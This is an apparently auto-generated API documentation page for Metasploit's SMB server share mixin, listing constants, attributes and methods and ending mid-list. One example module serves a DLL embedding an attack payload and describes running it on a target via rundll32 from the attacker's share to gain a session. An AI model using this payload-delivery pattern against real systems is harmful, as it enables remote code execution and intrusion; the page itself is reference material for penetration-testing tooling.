<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>
  Module: Msf::Exploit::Remote::SMB::Server::Share
  
    &mdash; Documentation by YARD 0.8.7.6
  
</title>

  <link rel="stylesheet" href="../../../../../css/style.css" type="text/css" charset="utf-8" />

  <link rel="stylesheet" href="../../../../../css/common.css" type="text/css" charset="utf-8" />

<script type="text/javascript" charset="utf-8">
  hasFrames = window.top.frames.main ? true : false;
  relpath = '../../../../../';
  framesUrl = "../../../../../frames.html#!Msf/Exploit/Remote/SMB/Server/Share.html";
</script>


  <script type="text/javascript" charset="utf-8" src="../../../../../js/jquery.js"></script>

  <script type="text/javascript" charset="utf-8" src="../../../../../js/app.js"></script>


  </head>
  <body>
    <div id="header">
      <div id="menu">
  
    <a href="../../../../../_index.html">Index (S)</a> &raquo;
    <span class='title'><span class='object_link'><a href="../../../../../Msf.html" title="Msf (module)">Msf</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../../../../Exploit.html" title="Msf::Exploit (class)">Exploit</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../../../Remote.html" title="Msf::Exploit::Remote (class)">Remote</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../../SMB.html" title="Msf::Exploit::Remote::SMB (module)">SMB</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../Server.html" title="Msf::Exploit::Remote::SMB::Server (module)">Server</a></span></span>
     &raquo; 
    <span class="title">Share</span>
  

  <div class="noframes"><span class="title">(</span><a href="." target="_top">no frames</a><span class="title">)</span></div>
</div>

      <div id="search">
  
    <a class="full_list_link" id="class_list_link"
        href="../../../../../class_list.html">
      Class List
    </a>
  
    <a class="full_list_link" id="method_list_link"
        href="../../../../../method_list.html">
      Method List
    </a>
  
    <a class="full_list_link" id="file_list_link"
        href="../../../../../file_list.html">
      File List
    </a>
  
</div>
      <div class="clear"></div>
    </div>

    <iframe id="search_frame"></iframe>

    <div id="content"><h1>Module: Msf::Exploit::Remote::SMB::Server::Share
  
  
  
</h1>

<dl class="box">
  
  
    
  
    
      <dt class="r1">Includes:</dt>
      <dd class="r1"><span class='object_link'><a href="../Server.html" title="Msf::Exploit::Remote::SMB::Server (module)">Msf::Exploit::Remote::SMB::Server</a></span>, <span class='object_link'><a href="Share/Command/Close.html" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Close (module)">Command::Close</a></span>, <span class='object_link'><a href="Share/Command/Negotiate.html" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Negotiate (module)">Command::Negotiate</a></span>, <span class='object_link'><a href="Share/Command/NtCreateAndx.html" title="Msf::Exploit::Remote::SMB::Server::Share::Command::NtCreateAndx (module)">Command::NtCreateAndx</a></span>, <span class='object_link'><a href="Share/Command/ReadAndx.html" title="Msf::Exploit::Remote::SMB::Server::Share::Command::ReadAndx (module)">Command::ReadAndx</a></span>, <span class='object_link'><a href="Share/Command/SessionSetupAndx.html" title="Msf::Exploit::Remote::SMB::Server::Share::Command::SessionSetupAndx (module)">Command::SessionSetupAndx</a></span>, <span class='object_link'><a href="Share/Command/Trans2.html" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Trans2 (module)">Command::Trans2</a></span>, <span class='object_link'><a href="Share/Command/Trans2/FindFirst2.html" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Trans2::FindFirst2 (module)">Command::Trans2::FindFirst2</a></span>, <span class='object_link'><a href="Share/Command/Trans2/QueryFileInformation.html" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Trans2::QueryFileInformation (module)">Command::Trans2::QueryFileInformation</a></span>, <span class='object_link'><a href="Share/Command/Trans2/QueryPathInformation.html" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Trans2::QueryPathInformation (module)">Command::Trans2::QueryPathInformation</a></span>, <span class='object_link'><a href="Share/InformationLevel/Find.html" title="Msf::Exploit::Remote::SMB::Server::Share::InformationLevel::Find (module)">InformationLevel::Find</a></span>, <span class='object_link'><a href="Share/InformationLevel/Query.html" title="Msf::Exploit::Remote::SMB::Server::Share::InformationLevel::Query (module)">InformationLevel::Query</a></span></dd>
      
    
  
  
  
    <dt class="r2 last">Defined in:</dt>
    <dd class="r2 last">lib/msf/core/exploit/smb/server/share.rb<span class="defines">,<br />
  lib/msf/core/exploit/smb/server/share/command.rb,<br /> lib/msf/core/exploit/smb/server/share/command/close.rb,<br /> lib/msf/core/exploit/smb/server/share/command/trans2.rb,<br /> lib/msf/core/exploit/smb/server/share/information_level.rb,<br /> lib/msf/core/exploit/smb/server/share/command/negotiate.rb,<br /> lib/msf/core/exploit/smb/server/share/command/read_andx.rb,<br /> lib/msf/core/exploit/smb/server/share/information_level/find.rb,<br /> lib/msf/core/exploit/smb/server/share/command/nt_create_andx.rb,<br /> lib/msf/core/exploit/smb/server/share/information_level/query.rb,<br /> lib/msf/core/exploit/smb/server/share/command/session_setup_andx.rb,<br /> lib/msf/core/exploit/smb/server/share/command/trans2/find_first2.rb,<br /> lib/msf/core/exploit/smb/server/share/command/trans2/query_path_information.rb,<br /> lib/msf/core/exploit/smb/server/share/command/trans2/query_file_information.rb</span>
</dd>
  
</dl>
<div class="clear"></div>

<h2>Overview</h2><div class="docstring">
  <div class="discussion">
    
<p>This mixin provides a minimal SMB server sharing an UNC resource. At this
moment it is capable to share just one file. And the file should live in
the root folder “\”.</p>


  </div>
</div>
<div class="tags">
  
  <div class="examples">
    <p class="tag_title">Examples:</p>
    
      
        <p class="example_title"><div class='inline'>
<p>Use it from an Auxiliary module</p>
</div></p>
      
      <pre class="example code"><code><span class='id identifier rubyid_require'>require</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>msf/core</span><span class='tstring_end'>&#39;</span></span>

<span class='kw'>class</span> <span class='const'>Metasploit3</span> <span class='op'>&lt;</span> <span class='const'>Msf</span><span class='op'>::</span><span class='const'>Auxiliary</span>

  <span class='id identifier rubyid_include'>include</span> <span class='const'>Msf</span><span class='op'>::</span><span class='const'>Exploit</span><span class='op'>::</span><span class='const'>Remote</span><span class='op'>::</span><span class='const'>SMB</span><span class='op'>::</span><span class='const'>Server</span><span class='op'>::</span><span class='const'>Share</span>

  <span class='kw'>def</span> <span class='id identifier rubyid_initialize'>initialize</span>
    <span class='kw'>super</span><span class='lparen'>(</span>
      <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Name</span><span class='tstring_end'>&#39;</span></span>        <span class='op'>=&gt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>SMB File Server</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span>
      <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Description</span><span class='tstring_end'>&#39;</span></span>    <span class='op'>=&gt;</span> <span class='tstring'><span class='tstring_beg'>%q{</span><span class='tstring_content'>
        This module provides a SMB File Server service
      </span><span class='tstring_end'>}</span></span><span class='comma'>,</span>
      <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Author</span><span class='tstring_end'>&#39;</span></span>      <span class='op'>=&gt;</span>
        <span class='lbracket'>[</span>
          <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Matthew Hall</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span>
          <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>juan vazquez</span><span class='tstring_end'>&#39;</span></span>
        <span class='rbracket'>]</span><span class='comma'>,</span>
      <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>License</span><span class='tstring_end'>&#39;</span></span>     <span class='op'>=&gt;</span> <span class='const'>MSF_LICENSE</span><span class='comma'>,</span>
      <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Actions</span><span class='tstring_end'>&#39;</span></span>     <span class='op'>=&gt;</span>
        <span class='lbracket'>[</span>
          <span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Service</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
        <span class='rbracket'>]</span><span class='comma'>,</span>
      <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PassiveActions</span><span class='tstring_end'>&#39;</span></span> <span class='op'>=&gt;</span>
        <span class='lbracket'>[</span>
          <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Service</span><span class='tstring_end'>&#39;</span></span>
        <span class='rbracket'>]</span><span class='comma'>,</span>
      <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>DefaultAction</span><span class='tstring_end'>&#39;</span></span>  <span class='op'>=&gt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Service</span><span class='tstring_end'>&#39;</span></span>
    <span class='rparen'>)</span>
  <span class='kw'>end</span>

  <span class='kw'>def</span> <span class='id identifier rubyid_run'>run</span>
    <span class='id identifier rubyid_print_status'>print_status</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Starting SMB Server on </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_unc'>unc</span><span class='embexpr_end'>}</span><span class='tstring_content'>...</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
    <span class='id identifier rubyid_exploit'>exploit</span>
  <span class='kw'>end</span>

  <span class='kw'>def</span> <span class='id identifier rubyid_primer'>primer</span>
    <span class='id identifier rubyid_print_status'>print_status</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Primer...</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
    <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_file_contents'>file_contents</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>METASPLOIT</span><span class='tstring_end'>&#39;</span></span>
  <span class='kw'>end</span>
<span class='kw'>end</span></code></pre>
    
      
        <p class="example_title"><div class='inline'>
<p>Use it from an Exploit module</p>
</div></p>
      
      <pre class="example code"><code><span class='id identifier rubyid_require'>require</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>msf/core</span><span class='tstring_end'>&#39;</span></span>

<span class='kw'>class</span> <span class='const'>Metasploit3</span> <span class='op'>&lt;</span> <span class='const'>Msf</span><span class='op'>::</span><span class='const'>Exploit</span><span class='op'>::</span><span class='const'>Remote</span>
  <span class='const'>Rank</span> <span class='op'>=</span> <span class='const'>ExcellentRanking</span>

  <span class='id identifier rubyid_include'>include</span> <span class='const'>Msf</span><span class='op'>::</span><span class='const'>Exploit</span><span class='op'>::</span><span class='const'>EXE</span>
  <span class='id identifier rubyid_include'>include</span> <span class='const'>Msf</span><span class='op'>::</span><span class='const'>Exploit</span><span class='op'>::</span><span class='const'>Remote</span><span class='op'>::</span><span class='const'>SMB</span><span class='op'>::</span><span class='const'>Server</span><span class='op'>::</span><span class='const'>Share</span>

  <span class='kw'>def</span> <span class='id identifier rubyid_initialize'>initialize</span><span class='lparen'>(</span><span class='id identifier rubyid_info'>info</span><span class='op'>=</span><span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
    <span class='kw'>super</span><span class='lparen'>(</span><span class='id identifier rubyid_update_info'>update_info</span><span class='lparen'>(</span><span class='id identifier rubyid_info'>info</span><span class='comma'>,</span>
      <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Name</span><span class='tstring_end'>&#39;</span></span>           <span class='op'>=&gt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Example Exploit</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span>
      <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Description</span><span class='tstring_end'>&#39;</span></span>    <span class='op'>=&gt;</span> <span class='tstring'><span class='tstring_beg'>%q{</span><span class='tstring_content'>
        Example exploit, the Server shares a DLL embedding the payload. A session
        can be achieved by executing &#39;rundll32.exe \\srvhost\share\test.dll,0&#39; from
        from the target.
      </span><span class='tstring_end'>}</span></span><span class='comma'>,</span>
      <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>License</span><span class='tstring_end'>&#39;</span></span>        <span class='op'>=&gt;</span> <span class='const'>MSF_LICENSE</span><span class='comma'>,</span>
      <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Author</span><span class='tstring_end'>&#39;</span></span>         <span class='op'>=&gt;</span>
        <span class='lbracket'>[</span>
          <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Matthew Hall</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span>
          <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>juan vazquez</span><span class='tstring_end'>&#39;</span></span>
        <span class='rbracket'>]</span><span class='comma'>,</span>
      <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>References</span><span class='tstring_end'>&#39;</span></span>     <span class='op'>=&gt;</span>
        <span class='lbracket'>[</span>
          <span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>URL</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>https://github.com/rapid7/metasploit-framework/pull/3074</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
        <span class='rbracket'>]</span><span class='comma'>,</span>
      <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Payload</span><span class='tstring_end'>&#39;</span></span>        <span class='op'>=&gt;</span>
        <span class='lbrace'>{</span>
          <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Space</span><span class='tstring_end'>&#39;</span></span>       <span class='op'>=&gt;</span> <span class='int'>2048</span><span class='comma'>,</span>
          <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>DisableNops</span><span class='tstring_end'>&#39;</span></span> <span class='op'>=&gt;</span> <span class='kw'>true</span>
        <span class='rbrace'>}</span><span class='comma'>,</span>
        <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Platform</span><span class='tstring_end'>&#39;</span></span>       <span class='op'>=&gt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>win</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span>
        <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Targets</span><span class='tstring_end'>&#39;</span></span>        <span class='op'>=&gt;</span>
          <span class='lbracket'>[</span>
            <span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Windows XP SP3 / Windows 2003 SP2</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rbracket'>]</span><span class='comma'>,</span>
          <span class='rbracket'>]</span><span class='comma'>,</span>
        <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Privileged</span><span class='tstring_end'>&#39;</span></span>     <span class='op'>=&gt;</span> <span class='kw'>false</span><span class='comma'>,</span>
        <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>DisclosureDate</span><span class='tstring_end'>&#39;</span></span> <span class='op'>=&gt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Mar 02 2015</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span>
        <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>DefaultTarget</span><span class='tstring_end'>&#39;</span></span>  <span class='op'>=&gt;</span> <span class='int'>0</span><span class='rparen'>)</span><span class='rparen'>)</span>

    <span class='id identifier rubyid_register_options'>register_options</span><span class='lparen'>(</span>
      <span class='lbracket'>[</span>
        <span class='const'>OptString</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>FILE_NAME</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='lbracket'>[</span> <span class='kw'>false</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>DLL File name to share</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>test.dll</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span>
      <span class='rbracket'>]</span><span class='comma'>,</span> <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_class'>class</span><span class='rparen'>)</span>

    <span class='id identifier rubyid_deregister_options'>deregister_options</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>FILE_CONTENTS</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
  <span class='kw'>end</span>

  <span class='kw'>def</span> <span class='id identifier rubyid_primer'>primer</span>
    <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_file_contents'>file_contents</span> <span class='op'>=</span> <span class='id identifier rubyid_generate_payload_dll'>generate_payload_dll</span>
    <span class='id identifier rubyid_print_status'>print_status</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>File available on </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_unc'>unc</span><span class='embexpr_end'>}</span><span class='tstring_content'>...</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
  <span class='kw'>end</span>
<span class='kw'>end</span></code></pre>
    
  </div>


</div><h2>Defined Under Namespace</h2>
<p class="children">
  
    
      <strong class="modules">Modules:</strong> <span class='object_link'><a href="Share/Command.html" title="Msf::Exploit::Remote::SMB::Server::Share::Command (module)">Command</a></span>, <span class='object_link'><a href="Share/InformationLevel.html" title="Msf::Exploit::Remote::SMB::Server::Share::InformationLevel (module)">InformationLevel</a></span>
    
  
    
  
</p>

  <h2>Constant Summary</h2>
  
    <dl class="constants">
      
        <dt id="FLAGS-constant" class="">FLAGS =
          
        </dt>
        <dd><pre class="code"><span class='const'>CONST</span><span class='op'>::</span><span class='const'>FLAGS_REQ_RES</span> <span class='op'>|</span> <span class='const'>CONST</span><span class='op'>::</span><span class='const'>FLAGS_CASE_SENSITIVE</span></pre></dd>
      
        <dt id="FLAGS2-constant" class="">FLAGS2 =
          
        </dt>
        <dd><pre class="code"><span class='const'>CONST</span><span class='op'>::</span><span class='const'>FLAGS2_UNICODE_STRINGS</span> <span class='op'>|</span>
<span class='const'>CONST</span><span class='op'>::</span><span class='const'>FLAGS2_EXTENDED_SECURITY</span> <span class='op'>|</span>
<span class='const'>CONST</span><span class='op'>::</span><span class='const'>FLAGS2_32_BIT_ERROR_CODES</span> <span class='op'>|</span>
<span class='const'>CONST</span><span class='op'>::</span><span class='const'>FLAGS2_LONG_PATH_COMPONENTS</span></pre></dd>
      
        <dt id="CAPABILITIES-constant" class="">CAPABILITIES =
          
        </dt>
        <dd><pre class="code"><span class='const'>CONST</span><span class='op'>::</span><span class='const'>CAP_UNIX_EXTENSIONS</span> <span class='op'>|</span>
<span class='const'>CONST</span><span class='op'>::</span><span class='const'>CAP_LARGE_WRITEX</span> <span class='op'>|</span>
<span class='const'>CONST</span><span class='op'>::</span><span class='const'>CAP_LARGE_READX</span> <span class='op'>|</span>
<span class='const'>CONST</span><span class='op'>::</span><span class='const'>CAP_PASSTHRU</span> <span class='op'>|</span>
<span class='const'>CONST</span><span class='op'>::</span><span class='const'>CAP_DFS</span> <span class='op'>|</span>
<span class='const'>CONST</span><span class='op'>::</span><span class='const'>CAP_NT_FIND</span> <span class='op'>|</span>
<span class='const'>CONST</span><span class='op'>::</span><span class='const'>CAP_LOCK_AND_READ</span> <span class='op'>|</span>
<span class='const'>CONST</span><span class='op'>::</span><span class='const'>CAP_LEVEL_II_OPLOCKS</span> <span class='op'>|</span>
<span class='const'>CONST</span><span class='op'>::</span><span class='const'>CAP_STATUS32</span> <span class='op'>|</span>
<span class='const'>CONST</span><span class='op'>::</span><span class='const'>CAP_RPC_REMOTE_APIS</span> <span class='op'>|</span>
<span class='const'>CONST</span><span class='op'>::</span><span class='const'>CAP_NT_SMBS</span> <span class='op'>|</span>
<span class='const'>CONST</span><span class='op'>::</span><span class='const'>CAP_LARGE_FILES</span> <span class='op'>|</span>
<span class='const'>CONST</span><span class='op'>::</span><span class='const'>CAP_UNICODE</span> <span class='op'>|</span>
<span class='const'>CONST</span><span class='op'>::</span><span class='const'>CAP_RAW_MODE</span></pre></dd>
      
        <dt id="CREATE_MAX_ACCESS-constant" class="">CREATE_MAX_ACCESS =
          
        </dt>
        <dd><pre class="code"><span class='const'>CONST</span><span class='op'>::</span><span class='const'>SMB_READ_ACCESS</span> <span class='op'>|</span>
<span class='const'>CONST</span><span class='op'>::</span><span class='const'>SMB_WRITE_ACCESS</span> <span class='op'>|</span>
<span class='const'>CONST</span><span class='op'>::</span><span class='const'>SMB_APPEND_ACCESS</span> <span class='op'>|</span>
<span class='const'>CONST</span><span class='op'>::</span><span class='const'>SMB_READ_EA_ACCESS</span> <span class='op'>|</span>
<span class='const'>CONST</span><span class='op'>::</span><span class='const'>SMB_WRITE_EA_ACCESS</span> <span class='op'>|</span>
<span class='const'>CONST</span><span class='op'>::</span><span class='const'>SMB_EXECUTE_ACCESS</span> <span class='op'>|</span>
<span class='const'>CONST</span><span class='op'>::</span><span class='const'>SMB_DELETE_CHILD_ACCESS</span> <span class='op'>|</span>
<span class='const'>CONST</span><span class='op'>::</span><span class='const'>SMB_READ_ATTRIBUTES_ACCESS</span> <span class='op'>|</span>
<span class='const'>CONST</span><span class='op'>::</span><span class='const'>SMB_WRITE_ATTRIBUTES_ACCESS</span> <span class='op'>|</span>
<span class='const'>CONST</span><span class='op'>::</span><span class='const'>SMB_DELETE_ACCESS</span> <span class='op'>|</span>
<span class='const'>CONST</span><span class='op'>::</span><span class='const'>SMB_READ_CONTROL_ACCESS</span> <span class='op'>|</span>
<span class='const'>CONST</span><span class='op'>::</span><span class='const'>SMB_WRITE_DAC_ACCESS</span> <span class='op'>|</span>
<span class='const'>CONST</span><span class='op'>::</span><span class='const'>SMB_WRITE_OWNER_ACCESS</span> <span class='op'>|</span>
<span class='const'>CONST</span><span class='op'>::</span><span class='const'>SMB_SYNC_ACCESS</span></pre></dd>
      
        <dt id="TREE_CONNECT_MAX_ACCESS-constant" class="">TREE_CONNECT_MAX_ACCESS =
          
        </dt>
        <dd><pre class="code"><span class='const'>CONST</span><span class='op'>::</span><span class='const'>SMB_READ_ACCESS</span> <span class='op'>|</span>
<span class='const'>CONST</span><span class='op'>::</span><span class='const'>SMB_READ_EA_ACCESS</span> <span class='op'>|</span>
<span class='const'>CONST</span><span class='op'>::</span><span class='const'>SMB_EXECUTE_ACCESS</span> <span class='op'>|</span>
<span class='const'>CONST</span><span class='op'>::</span><span class='const'>SMB_READ_ATTRIBUTES_ACCESS</span> <span class='op'>|</span>
<span class='const'>CONST</span><span class='op'>::</span><span class='const'>SMB_READ_CONTROL_ACCESS</span> <span class='op'>|</span>
<span class='const'>CONST</span><span class='op'>::</span><span class='const'>SMB_SYNC_ACCESS</span></pre></dd>
      
    </dl>
  



  
  
  <h3 class="inherited">Constants included
     from <span class='object_link'><a href="../Server.html" title="Msf::Exploit::Remote::SMB::Server (module)">Msf::Exploit::Remote::SMB::Server</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span>, <span class='object_link'><a href="../Server.html#CRYPT-constant" title="Msf::Exploit::Remote::SMB::Server::CRYPT (constant)">CRYPT</a></span>, <span class='object_link'><a href="../Server.html#EVADE-constant" title="Msf::Exploit::Remote::SMB::Server::EVADE (constant)">EVADE</a></span>, <span class='object_link'><a href="../Server.html#UTILS-constant" title="Msf::Exploit::Remote::SMB::Server::UTILS (constant)">UTILS</a></span>, <span class='object_link'><a href="../Server.html#XCEPT-constant" title="Msf::Exploit::Remote::SMB::Server::XCEPT (constant)">XCEPT</a></span></p>

  
  
  <h3 class="inherited">Constants included
     from <span class='object_link'><a href="../../../NTLM.html" title="Msf::Exploit::NTLM (module)">NTLM</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="../../../NTLM.html#NTLM_BASE-constant" title="Msf::Exploit::NTLM::NTLM_BASE (constant)">NTLM::NTLM_BASE</a></span>, <span class='object_link'><a href="../../../NTLM.html#NTLM_CONST-constant" title="Msf::Exploit::NTLM::NTLM_CONST (constant)">NTLM::NTLM_CONST</a></span>, <span class='object_link'><a href="../../../NTLM.html#NTLM_CRYPT-constant" title="Msf::Exploit::NTLM::NTLM_CRYPT (constant)">NTLM::NTLM_CRYPT</a></span>, <span class='object_link'><a href="../../../NTLM.html#NTLM_MESSAGE-constant" title="Msf::Exploit::NTLM::NTLM_MESSAGE (constant)">NTLM::NTLM_MESSAGE</a></span>, <span class='object_link'><a href="../../../NTLM.html#NTLM_UTILS-constant" title="Msf::Exploit::NTLM::NTLM_UTILS (constant)">NTLM::NTLM_UTILS</a></span></p>


  <h2>Instance Attribute Summary <small>(<a href="#" class="summary_toggle">collapse</a>)</small></h2>
  <ul class="summary">
    
      <li class="public ">
  <span class="summary_signature">
    
      <a href="#file_contents-instance_method" title="#file_contents (instance method)">- (String) <strong>file_contents</strong> </a>
    

    
  </span>
  
  
  
    
    
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>The contents of the provided file.</p>
</div></span>
  
</li>

    
      <li class="public ">
  <span class="summary_signature">
    
      <a href="#file_name-instance_method" title="#file_name (instance method)">- (String) <strong>file_name</strong> </a>
    

    
  </span>
  
  
  
    
    
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>The file name of the provided UNC.</p>
</div></span>
  
</li>

    
      <li class="public ">
  <span class="summary_signature">
    
      <a href="#folder_name-instance_method" title="#folder_name (instance method)">- (String) <strong>folder_name</strong> </a>
    

    
  </span>
  
  
  
    
    
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>The folder where the provided file lives.</p>
</div></span>
  
</li>

    
      <li class="public ">
  <span class="summary_signature">
    
      <a href="#hi-instance_method" title="#hi (instance method)">- (Fixnum) <strong>hi</strong> </a>
    

    
  </span>
  
  
  
    
    
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>The high 4 bytes for the file &#39;created time&#39;.</p>
</div></span>
  
</li>

    
      <li class="public ">
  <span class="summary_signature">
    
      <a href="#lo-instance_method" title="#lo (instance method)">- (Fixnum) <strong>lo</strong> </a>
    

    
  </span>
  
  
  
    
    
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>The low 4 bytes for the file &#39;created time&#39;.</p>
</div></span>
  
</li>

    
      <li class="public ">
  <span class="summary_signature">
    
      <a href="#share-instance_method" title="#share (instance method)">- (String) <strong>share</strong> </a>
    

    
  </span>
  
  
  
    
    
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>The share portion of the provided UNC.</p>
</div></span>
  
</li>

    
  </ul>



  
  
  <h3 class="inherited">Attributes included from <span class='object_link'><a href="../../TcpServer.html" title="Msf::Exploit::Remote::TcpServer (module)">TcpServer</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="../../TcpServer.html#service-instance_method" title="Msf::Exploit::Remote::TcpServer#service (method)">#service</a></span></p>


  
    <h2>
      Instance Method Summary
      <small>(<a href="#" class="summary_toggle">collapse</a>)</small>
    </h2>

    <ul class="summary">
      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#get_file_contents-instance_method" title="#get_file_contents (instance method)">- (String) <strong>get_file_contents</strong>(client:, file: &#39;&#39;, folder: &#39;&#39;) </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Returns the file contents for the requested file.</p>
</div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#initialize-instance_method" title="#initialize (instance method)">- (Object) <strong>initialize</strong>(info = {}) </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'></div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#setup-instance_method" title="#setup (instance method)">- (Object) <strong>setup</strong> </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Setups the server configuration.</p>
</div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#smb_cmd_dispatch-instance_method" title="#smb_cmd_dispatch (instance method)">- (Fixnum) <strong>smb_cmd_dispatch</strong>(cmd, c, buff) </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Main dispatcher function.</p>
</div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#smb_conn-instance_method" title="#smb_conn (instance method)">- (Hash) <strong>smb_conn</strong>(c) </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>New connection handler, executed when there is a new connection.</p>
</div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#srvhost-instance_method" title="#srvhost (instance method)">- (String) <strong>srvhost</strong> </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Builds the server address.</p>
</div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
